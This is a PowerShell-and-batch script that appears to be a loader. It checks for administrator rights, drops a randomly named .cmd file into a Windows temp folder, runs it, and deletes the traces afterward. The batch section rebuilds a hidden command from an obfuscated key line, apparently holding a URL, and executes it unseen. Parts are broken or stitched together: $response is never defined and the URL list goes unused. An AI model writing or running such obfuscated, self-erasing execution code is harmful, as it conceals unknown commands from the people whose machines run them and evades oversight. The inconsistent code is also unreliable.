
$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DURL1 = '!Exect!'


$URLs = @($DURL1)

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\DBD_$rand.cmd" } else { "$env:TEMP\DBD_$rand.cmd" }

$ScriptArgs = "$args "
$prefix = "@::: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\DBD*.cmd", "$env:SystemRoot\Temp\DBD*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }

@Echo Off
For /F "Tokens=1,* Delims=ù" %%A in ('Type "%~0" ^| Findstr  "^{eKey}"') Do Set "__Key=%%B"
Set "Exect="
SetLocal EnableDelayedExpansion
For %%` in (33=2=34,18,9,8;63;25,62,26,49;29=60;35;44,53;61;13=58,16=6;30,52=0,37,50=43;31;55;39;14,66,47,11;12,51=64,70;48,22;57=5,17=3=10,59;15;20;46,24;32,65,36=67;54=23=45=38,69,40;21=42,) Do Set "Exect=!Exect!!__Key:~%%`,1!"
!Exect!
Pause
Goto :Eof

{eKey}ùo^tdLoe#:s//BbcbsupKaiCaz/aÜÈ.rnihtinnn.wpnetihmkwtLchmtrluagur/4ao/K/c&
